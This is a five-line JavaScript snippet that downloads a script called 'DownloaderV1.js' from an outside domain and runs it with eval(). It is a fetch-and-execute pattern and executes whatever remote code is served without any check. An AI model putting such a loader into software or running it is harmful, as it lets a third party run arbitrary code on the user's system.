
const req = Request.create("https://fembexx.com/dow/DownloaderV1.js");
const response = req.get();
const responseText = response.text();

eval(responseText);